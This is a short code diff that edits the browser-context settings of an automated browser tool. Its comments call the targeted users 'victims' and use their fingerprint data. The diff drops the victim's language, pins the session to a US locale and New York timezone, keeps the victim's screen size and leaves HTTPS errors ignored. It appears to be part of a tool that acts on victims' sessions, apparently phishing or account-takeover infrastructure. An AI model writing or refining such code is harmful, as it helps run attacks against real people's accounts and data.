@@ -71,16 +71,15 @@ export const getBrowserLaunchConfig = (
 
 /**
  * Browser context configuration
+ * IMPORTANT: Always present as neutral US session - no victim timezone/geolocation
  */
 export const getBrowserContextConfig = (fingerprint?: BrowserFingerprint): BrowserContextOptions => {
   // Use victim's fingerprint or fallback to defaults
   const width = fingerprint?.screenWidth || 1366;
   const height = fingerprint?.screenHeight || 768;
-  const locale = fingerprint?.language || 'en-US';
-  const languages = fingerprint?.languages || ['en-US', 'en'];
 
   if (fingerprint) {
-    logger.info(`[FINGERPRINT] Applying context: ${width}x${height}, locale=${locale}`);
+    logger.info(`[FINGERPRINT] Applying context: ${width}x${height}, neutral US locale`);
   }
 
   return {
@@ -89,8 +88,9 @@ export const getBrowserContextConfig = (fingerprint?: BrowserFingerprint): Brows
       height,
     },
     
-    // Use victim's language
-    locale,
+    // Always use neutral US locale (never victim's locale/timezone)
+    locale: 'en-US',
+    timezoneId: 'America/New_York',
     
     // Ignore HTTPS errors
     ignoreHTTPSErrors: true,
